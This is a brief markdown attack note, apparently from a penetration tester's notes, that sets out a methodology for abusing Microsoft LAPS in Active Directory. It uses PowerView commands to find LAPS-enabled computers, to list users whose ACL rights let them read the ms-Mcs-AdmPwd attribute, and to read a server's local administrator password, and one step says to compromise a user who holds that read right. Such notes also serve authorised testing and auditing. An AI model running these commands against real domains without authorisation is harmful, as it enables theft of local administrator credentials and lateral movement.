# Methodology
> 1. Check if LAPS is present locally by looking for `C:\Program Files\LAPS\CSE\AdmPwd.dll`.
> 2. Check if LAPS is present in the domain.
> 3. Enumerate what user can read LAPS credentials in OUs.
> 4. Enumerate OUs where LAPS is in use.
> 5. Compromise the user that can read LAPS credentials in OUs.
> 6. Read LAPS credentials.
---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView
**Find what computer has LAPS:**
```powershell
Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
```
**Find users who can read LAPS:**
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

**Read LAPS credential:**
```powershell
Get-DomainObject -Identity server1$ | select -ExpandProperty ms-mcs-admpwd
```
